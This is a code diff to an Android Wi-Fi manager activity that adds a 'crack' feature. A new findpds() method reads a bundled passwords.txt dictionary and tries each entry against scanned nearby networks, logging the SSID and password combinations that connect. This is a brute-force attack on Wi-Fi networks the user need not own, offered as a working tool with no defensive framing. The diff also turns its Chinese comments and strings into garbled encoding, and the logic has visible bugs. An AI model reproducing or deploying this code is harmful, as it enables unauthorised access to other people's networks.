@@ -1,5 +1,8 @@
 package com.jcc.conwifi;
 
+import java.io.BufferedReader;
+import java.io.InputStream;
+import java.io.InputStreamReader;
 import java.util.List;
 
 import android.app.Activity;
@@ -27,7 +30,7 @@ import android.widget.Toast;
 /**
  * @ClassName: WifiActivity
  * @Description: jcc
- * @date 2016å¹´9æœˆ23æ—¥ 17:00:23
+ * @date 2016Äê9ÔÂ23ÈÕ 17:00:23
  *
  */
 public class WifiActivity extends Activity implements OnClickListener
@@ -35,19 +38,25 @@ public class WifiActivity extends Activity implements OnClickListener
 
     private Button scan_button;
 
+    private Button crack;
+
     private TextView wifi_result_textview;
+
+    private TextView crack_result;
 
     private WifiManager wifiManager;
 
-    private WifiInfo currentWifiInfo;// å½“å‰æ‰€è¿æ¥çš„wifi
+    private WifiInfo currentWifiInfo;// µ±Ç°ËùÁ¬½ÓµÄwifi
 
-    private List<ScanResult> wifiList;// wifiåˆ—è¡¨
+    private List<ScanResult> wifiList;// wifiÁĞ±í
 
     private String[] str;
 
     private int wifiIndex;
 
     private ProgressDialog progressDialog;
+
+    private static int crack_flag = 1;
 
     @Override
     protected void onCreate(Bundle savedInstanceState)
@@ -64,7 +73,7 @@ public class WifiActivity extends Activity implements OnClickListener
     {
         openWifi();
         currentWifiInfo = wifiManager.getConnectionInfo();
-        wifi_result_textview.setText("å½“å‰ç½‘ç»œï¼š" + currentWifiInfo.getSSID()
+        wifi_result_textview.setText("µ±Ç°ÍøÂç£º" + currentWifiInfo.getSSID()
                 + " ip:" + WifiUtil.intToIp(currentWifiInfo.getIpAddress()));
         new ScanWifiThread().start();
         super.onResume();
@@ -75,6 +84,7 @@ public class WifiActivity extends Activity implements OnClickListener
     {
         scan_button = (Button) findViewById(R.id.scan_button);
         wifi_result_textview = (TextView) findViewById(R.id.wifi_result);
+        crack_result = (TextView) findViewById(R.id.crack_result);
 
 
     }
@@ -83,6 +93,7 @@ public class WifiActivity extends Activity implements OnClickListener
     public void initListener()
     {
         scan_button.setOnClickListener(this);
+        crack.setOnClickListener(this);
 
     }
 
@@ -94,11 +105,14 @@ public class WifiActivity extends Activity implements OnClickListener
             case R.id.scan_button:
                 lookUpScan();
                 break;
+            case R.id.crack:
+                findpds();
+                break;
         }
     }
 
     /**
-     * æ‰“å¼€wifi
+     * ´ò¿ªwifi
      */
     public void openWifi()
     {
@@ -109,7 +123,7 @@ public class WifiActivity extends Activity implements OnClickListener
     }
 
     /**
-     * æ‰«æwifiçº¿ç¨‹
+     * É¨ÃèwifiÏß³Ì
      *
      * @author passing
      *
@@ -137,12 +151,12 @@ public class WifiActivity extends Activity implements OnClickListener
     }
 
     /**
-     * æ‰«æwifi
+     * É¨Ãèwifi
      */
     public void startScan()
     {
         wifiManager.startScan();
-        // è·å–æ‰«æç»“æœ
+        // »ñÈ¡É¨Ãè½á¹û
         wifiList = wifiManager.getScanResults();
         str = new String[wifiList.size()];
         String tempStr = null;
@@ -152,14 +166,14 @@ public class WifiActivity extends Activity implements OnClickListener
             if (null != currentWifiInfo
                     && tempStr.equals(currentWifiInfo.getSSID()))
             {
-                tempStr = tempStr + "(å·²è¿æ¥)";
+                tempStr = tempStr + "(ÒÑÁ¬½Ó)";
             }
             str[i] = tempStr;
         }
     }
 
     /**
-     * å¼¹å‡ºæ¡† æŸ¥çœ‹æ‰«æç»“æœ
+     * µ¯³ö¿ò ²é¿´É¨Ãè½á¹û
      */
     public void lookUpScan()
     {
@@ -172,6 +186,7 @@ public class WifiActivity extends Activity implements OnClickListener
             public void onClick(DialogInterface dialog, int which)
             {
                 wifiIndex = which;
+                //É¨Ãè³öwifi
                 handler.sendEmptyMessage(3);
             }
         });
@@ -179,7 +194,7 @@ public class WifiActivity extends Activity implements OnClickListener
     }
 
     /**
-     * è·å–ç½‘ç»œipåœ°å€
+     * »ñÈ¡ÍøÂçipµØÖ·
      *
      * @author passing
      *
@@ -200,26 +215,29 @@ public class WifiActivity extends Activity implements OnClickListener
                     flag = false;
                 }
             }
+            //Á¬½Ó³É¹¦
             handler.sendEmptyMessage(4);
             super.run();
         }
     }
 
     /**
-     * è¿æ¥ç½‘ç»œ
+     * Á¬½ÓÍøÂç
      *
      * @param index
      * @param password
      */
     public void connetionConfiguration(int index, String password)
     {
-        progressDialog = ProgressDialog.show(WifiActivity.this, "æ­£åœ¨è¿æ¥...",
-                "è¯·ç¨å€™...");
+        progressDialog = ProgressDialog.show(WifiActivity.this, "ÕıÔÚÁ¬½Ó...",
+                "ÇëÉÔºò...");
         new ConnectWifiThread().execute(index + "", password);
+
     }
 
+
     /**
-     * è¿æ¥wifi
+     * Á¬½Ówifi
      *
      * @author passing
      *
@@ -235,7 +253,7 @@ public class WifiActivity extends Activity implements OnClickListener
             {
                 return null;
             }
-            // è¿æ¥é…ç½®å¥½æŒ‡å®šIDçš„ç½‘ç»œ
+            // Á¬½ÓÅäÖÃºÃÖ¸¶¨IDµÄÍøÂç
             WifiConfiguration config = WifiUtil.createWifiInfo(
                     wifiList.get(index).SSID, params[1], 3, wifiManager);
 
@@ -257,10 +275,14 @@ public class WifiActivity extends Activity implements OnClickListener
             }
             if (null != result)
             {
+                crack_flag = 0;
+                //Á¬½Ó³É¹¦
                 handler.sendEmptyMessage(0);
             }
             else
             {
+                crack_flag = 1;
+                //Á¬½ÓÊ§°Ü
                 handler.sendEmptyMessage(1);
             }
             super.onPostExecute(result);
@@ -277,21 +299,21 @@ public class WifiActivity extends Activity implements OnClickListener
             switch (msg.what)
             {
                 case 0:
-                    wifi_result_textview.setText("æ­£åœ¨è·å–ipåœ°å€...");
+                    wifi_result_textview.setText("ÕıÔÚ»ñÈ¡ipµØÖ·...");
                     new RefreshSsidThread().start();
                     break;
                 case 1:
-                    Toast.makeText(WifiActivity.this, "è¿æ¥å¤±è´¥ï¼", Toast.LENGTH_SHORT)
+                    Toast.makeText(WifiActivity.this, "Á¬½ÓÊ§°Ü£¡", Toast.LENGTH_SHORT)
                             .show();
                     break;
                 case 3:
                     View layout = LayoutInflater.from(WifiActivity.this).inflate(
                             R.layout.custom_dialog_layout, null);
                     Builder builder = new Builder(WifiActivity.this);
-                    builder.setTitle("è¯·è¾“å…¥å¯†ç ").setView(layout);
+                    builder.setTitle("ÇëÊäÈëÃÜÂë").setView(layout);
                     final EditText passowrdText = (EditText) layout
                             .findViewById(R.id.password_edittext);
-                    builder.setPositiveButton("è¿æ¥",
+                    builder.setPositiveButton("Á¬½Ó",
                             new DialogInterface.OnClickListener()
                             {
 
@@ -305,9 +327,9 @@ public class WifiActivity extends Activity implements OnClickListener
                             }).show();
                     break;
                 case 4:
-                    Toast.makeText(WifiActivity.this, "è¿æ¥æˆåŠŸï¼", Toast.LENGTH_SHORT)
+                    Toast.makeText(WifiActivity.this, "Á¬½Ó³É¹¦£¡", Toast.LENGTH_SHORT)
                             .show();
-                    wifi_result_textview.setText("å½“å‰ç½‘ç»œï¼š"
+                    wifi_result_textview.setText("µ±Ç°ÍøÂç£º"
                             + currentWifiInfo.getSSID() + " ip:"
                             + WifiUtil.intToIp(currentWifiInfo.getIpAddress()));
                     break;
@@ -316,5 +338,39 @@ public class WifiActivity extends Activity implements OnClickListener
         }
 
     };
+    //¶ÁÈ¡×Öµä
+    public  void  findpds() {
+        try {
+            InputStream is = getAssets().open("passwords.txt");
+            BufferedReader br = new BufferedReader(new InputStreamReader(is));
+            //¹¹ÔìÒ»¸öBufferedReaderÀàÀ´¶ÁÈ¡ÎÄ¼ş
+            String s ;
 
+            String tempStr = null;
+
+            for (int i = 0; i < wifiList.size(); i++)
+            {
+                tempStr = wifiList.get(i).SSID;
+                while((s = br.readLine())!=null){//Ê¹ÓÃreadLine·½·¨£¬Ò»´Î¶ÁÒ»ĞĞ
+                    System.out.println(s);
+                    connetionConfiguration(i, s);
+                    if (crack_flag == 0){
+                        if(crack_result.getText().toString()=="") {
+                            crack_result.setText(tempStr+" "+s);
+                        }else {
+                            crack_result.setText(crack_result.getText().toString()
+                                    +"\n"+tempStr+" "+s);
+                        }
+                        crack_flag=1;
+                        break;
+                    }
+                }
+            }
+
+            br.close();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
 }
+
